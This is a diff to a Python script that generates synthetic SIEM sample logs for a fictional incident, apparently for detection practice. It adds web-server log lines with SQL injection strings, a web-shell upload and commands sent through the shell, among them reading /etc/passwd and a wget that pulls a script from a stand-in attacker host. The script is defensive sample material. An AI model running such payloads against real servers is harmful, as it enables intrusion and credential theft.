@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """Generate the multi-source SIEM sample dataset in samples/siem/ (deterministic).
 
-One coherent incident across six export formats, using documentation IP ranges only:
+One coherent incident across seven sources, using documentation IP ranges only:
   192.0.2.0/24   internal LAN (TEST-NET-1)       198.51.100.0/29 ISP block / public web server
   203.0.113.0/24 external attacker infrastructure (TEST-NET-3)
 A week of normal behaviour (the UEBA baseline) precedes the attack on 2026-10-18.
@@ -125,6 +125,11 @@ def firewall():
     for i, port in enumerate(list(range(20, 26)) + [53, 80, 110, 135, 139, 143, 443, 445, 993, 1433, 3306, 3389, 5432, 5900, 8080]):
         fw(a + timedelta(hours=2, seconds=i), "203.0.113.50", "198.51.100.2", port,
            action="allow" if port in (80, 443) else "deny", rule="perimeter")
+    # The web attack that follows the scan reaches WEB01 through the allowed web port
+    for m in (5, 8, 11, 12, 13):
+        fw(a + timedelta(hours=2, minutes=m), "203.0.113.50", "198.51.100.2", 80, sent=900, recv=6000, rule="perimeter")
+    # ...and the web shell pulls a second stage from the attacker's server (egress allowed)
+    fw(a + timedelta(hours=2, minutes=14, seconds=1), "198.51.100.2", "203.0.113.61", 80, sent=400, recv=18000, rule="web")
     # Approved vulnerability scanner sweeping internal servers (context, still reported)
     for i, port in enumerate(range(1, 40)):
         fw(a + timedelta(hours=2, minutes=30, seconds=i), "192.0.2.250", "192.0.2.30", port, action="deny", rule="internal")
@@ -177,9 +182,45 @@ def ids():
         "Oct 18 03:14:20 ids01 CEF:0|OISF|Suricata|7.0|2027865|ET MALWARE Possible Cobalt Strike Beacon|9|src=192.0.2.22 dst=203.0.113.99 spt=51544 dpt=443 proto=TCP act=alert",
         "Oct 18 02:00:03 ids01 CEF:0|OISF|Suricata|7.0|2010937|ET SCAN Suspicious inbound to mySQL port 3306|5|src=203.0.113.50 dst=198.51.100.2 spt=40112 dpt=3306 proto=TCP act=alert",
         "Oct 18 03:45:30 ids01 CEF:0|OISF|Suricata|7.0|2024897|ET POLICY Possible data exfiltration large outbound TLS|7|src=192.0.2.40 dst=203.0.113.150 spt=50211 dpt=443 proto=TCP act=alert",
-        "Oct 18 01:12:00 ids01 CEF:0|OISF|Suricata|7.0|2100498|GPL ATTACK_RESPONSE id check returned root|7|src=198.51.100.2 dst=203.0.113.61 spt=80 dpt=51000 proto=TCP act=alert",
+        "Oct 18 02:13:01 ids01 CEF:0|OISF|Suricata|7.0|2100498|GPL ATTACK_RESPONSE id check returned root|7|src=198.51.100.2 dst=203.0.113.50 spt=80 dpt=51000 proto=TCP act=alert",
     ]
     (OUT / "ids_alerts.cef").write_text("\n".join(sorted(lines, key=lambda l: l[:15])) + "\n", encoding="utf-8")
+
+
+def web():
+    """Apache combined log of WEB01: normal visitors, then directory brute force, SQL injection,
+    web-shell upload and commands through the shell from the scanning IP."""
+    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0"
+    lines = []
+
+    def req(t, ip, method, url, status, size=2400, agent=ua, ref="-"):
+        lines.append((t, f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S} +0000] "{method} {url} HTTP/1.1" {status} {size} '
+                         f'"{ref}" "{agent}"'))
+
+    for d in range(8):
+        day = BASE + timedelta(days=d)
+        for _ in range(12):
+            t = day + timedelta(hours=rnd.randint(8, 20), minutes=rnd.randint(0, 59))
+            req(t, f"198.51.100.{rnd.randint(10, 60)}", "GET", rnd.choice(["/", "/products.php?id=3", "/about.html",
+                                                                          "/contact.html", "/products.php?id=7"]), 200)
+    a = ATT + timedelta(hours=2, minutes=5)
+    gob = "gobuster/3.6"
+    for i, (url, st) in enumerate([("/admin/", 403), ("/backup.zip", 404), ("/.env", 404), ("/.git/config", 404),
+                                   ("/phpmyadmin/", 404), ("/uploads/", 403), ("/login.php", 200), ("/admin/upload.php", 302)]):
+        req(a + timedelta(seconds=3 * i), "203.0.113.50", "GET", url, st, 320, gob)
+    sq = "sqlmap/1.8.2#stable"
+    a = ATT + timedelta(hours=2, minutes=8)
+    req(a, "203.0.113.50", "GET", "/products.php?id=3%27%20OR%20%271%27=%271", 500, 610, sq)
+    req(a + timedelta(seconds=20), "203.0.113.50", "GET",
+        "/products.php?id=3%20UNION%20SELECT%20username,password%20FROM%20admin_users--", 200, 5120, sq)
+    a = ATT + timedelta(hours=2, minutes=11)
+    req(a, "203.0.113.50", "POST", "/login.php", 302, 0, ua)
+    req(a + timedelta(seconds=90), "203.0.113.50", "POST", "/admin/upload.php", 200, 410, ua, "/admin/")
+    for k, cmd in enumerate(["id", "cat%20/etc/passwd", "wget%20http://203.0.113.61/x.sh%20-O%20/tmp/x.sh"]):
+        req(ATT + timedelta(hours=2, minutes=13, seconds=30 * k), "203.0.113.50", "GET", f"/uploads/shell.php?cmd={cmd}",
+            200, 180 + 40 * k, ua)
+    lines.sort()
+    (OUT / "web_access.log").write_text("\n".join(l for _, l in lines) + "\n", encoding="utf-8")
 
 
 def vpn():
@@ -247,6 +288,6 @@ def trust_demo():
 
 if __name__ == "__main__":
     OUT.mkdir(parents=True, exist_ok=True)
-    for f in (windows, firewall, dns, ids, vpn, winxml, trust_demo):
+    for f in (windows, firewall, dns, ids, vpn, winxml, web, trust_demo):
         f()
     print("written:", ", ".join(sorted(p.name for p in OUT.iterdir())))
